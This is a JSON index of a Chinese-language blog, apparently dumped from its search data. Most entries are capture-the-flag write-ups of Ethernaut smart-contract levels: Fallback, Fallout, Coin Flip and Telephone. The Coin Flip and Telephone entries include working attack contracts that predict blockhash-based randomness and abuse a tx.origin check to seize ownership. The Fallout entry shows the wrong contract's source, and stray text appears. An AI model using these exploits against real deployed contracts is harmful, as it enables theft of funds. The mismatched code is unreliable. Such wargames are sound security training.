[{"title":"就像冬天下雪，不算多特别","url":"//news/","content":"\n\n","categories":["Introduce"],"tags":["Arknights"]},{"title":"Ethernaut Test-2","url":"/2024/08/11/ETH02/","content":"Test 2-Fallout// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 获取该合约的所有权\n\n观察这个合约，我们可以发现该合约使用的 solidity 版本为 0.6.0，而在这个版本中我们要声明一个构造函数的方式和 0.8 版本中的方式是不同的\n//0.8版本及以上contract Example&#123;\tconstructor() &#123;&#125;&#125;//0.6版本（包含以下）contract Example&#123;\tfunction Example() &#123;\t&#125;&#125;//即在0.6这个版本中，我们需要构造函数的名称与合约的名称一致\n\n那么在这道题中，有的盲生可能就发现了华点\n\n我们的合约名称与“构造”的这个函数名称并不一致！一个是 Fallout，一个是 Fal1out。也就是说，这并不是一个构造函数，而是一个普通函数，这也是整个合约报错的原因！\n\n在这个函数中，owner 被设置为部署合约的人，那么怎么获取合约的所有权呢\n\n\n因为这是一个可以调用的公用函数，所以我们可以调用它，这样就能获得合约的所有权\n我们要声明一个接口，用于调用这个公用函数 Fal1out\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8;interface Fallout &#123;    function owner() external view returns(address);    function Fal1out() external payable;&#125;\n\n\n回到 eth 靶场，打开浏览器控制台获取合同的地址\n在 At Address 中填入获得到的合同地址，并部署合约\n调用 Fal1out 这个函数，等待交易完成后查看 owner 是否被更改为我们的地址\n完成解题\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-1","url":"/2024/08/11/ETH01/","content":"Test 1-Fallback// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 1.获取该合约的所有权 2.将合约中的余额清零\n\n那么我们一个一个来\n1.首先是获取合约所有权，我们可以看到 owner 这个状态变量，在最后一行中的\nowner = msg.sender;//说明要获得这个合约的所有权，我们必须要向其发送&gt;=0的ether//合约中的contributions[msg.sender]给我提供了一个方向，就是去寻找这个contribution的状态变量，果然我找到了一个函数contribute，通过调用这个函数，我们就可以向该合约发送ether，接着再调用receive函数，这样就能将合约的拥有者设置为我们自己\n\n2.然后是将合约中的余额清零，这个好办，在完成第一步后直接调用 withdraw 函数就 ok 了\n\n注意事项\n\n在部署合约前，在 eth 靶场的界面用 f12 打开控制台输入 contract.address 获得部署地址，部署时在“At Address”这一栏中填入\n在部署完成后的界面中，并没有 receive 这个按钮，这个时候通过 low level interractions 功能，再次发送一个 eth，调用 receive 函数\n上述操作完成后记得验证 owner 是否已经被更改为我们的地址\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-3","url":"/2024/08/11/ETH03/","content":"Test 3-Coin Flip// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n\n题目的要求是 “猜硬币”，并连续 10 次猜对结果\n\n\n分析这段合约的时候我们看出，在我们调用 flip 这个函数时，consecutiveWins 会递增。consecutiveWins 增加的条件是输入的猜测结果 guess 等于 合约内部执行的计算结果 side\n\n如果我们的猜测结果连续十次与变量 side 相等，就赢得了这个挑战\n\n我们先创建一个名为 hack 的合约，在这个合约中传入 coinflip 的地址，将其命名为 target\n再建立一个构造函数，用来设定 target 变量\ncontract Hack &#123;    CoinFlip private immutable target;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;\n\n接下来我们声明一个函数，并连续调用它十次，这样可以连续十次增加胜利次数\n我们命名这个函数为 flip\nfunction flip() external &#123;      bool guess = _guess(); //这里调用一个内部函数_guess，用来猜测结果      require(target.flip(guess), &quot;guess failed&quot;); //用require来判定结果是否正确    &#125;function _guess() private view returns(bool)&#123;//那么问题来了，怎么才能保证猜测结果始终正确呢&#125;\n\n我们翻一下源代码，发现了计算猜测结果的函数，删去不需要的部分后，放入_guess 这个内部函数中\n得到的结果\nfunction flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;    //这里的计算过程有个FACTOR，我们把源代码中的这个值粘贴到hack合约中，得到最后的结果\n\ncontract Hack &#123;    CoinFlip private immutable target;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;    function flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;&#125;\n\n这个时候再连续调用十次 flip 函数，即可完成这个挑战\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-4","url":"/2024/08/11/ETH04/","content":"Test 4-Telephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n%localappdata%\n\n目标：获取合约的所有权\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n我们找到其中的changeOwner函数，并寻找 owner 在哪些地方能被变更，然后我们发现在构造函数constructor里将 owner 设置为这个合约的部署者\n在changeOwner函数中，它接受一个输入，并将 owner 这个状态变量设置为新的所有者的地址\n而它需要满足条件**tx.origin !&#x3D; msg.sender**\n什么意思呢 我们回顾一下：\n\ntx.origin 是发起交易的账户\nmsg.sender 是当前直接调用这个合约的即时账户\n\n要完成目标，我们可以先创建一个攻击合约，用来调用 Telephone 合约，这样 tx.origin 将是我们的账户，而 msg.sender 将是攻击合约，以此来达成条件**tx.origin !&#x3D; msg.sender**\n编写攻击合约contract Hack&#123;\tconstructor(address _target)&#123;\t\tTelephone(_target).changeOwner(msg.sender);\t&#125;&#125;\n\n之后我们向 Telephone 合约的地址部署 Hack 合约，即可完成挑战\n","categories":["Ethernaut"],"tags":["Test"]}]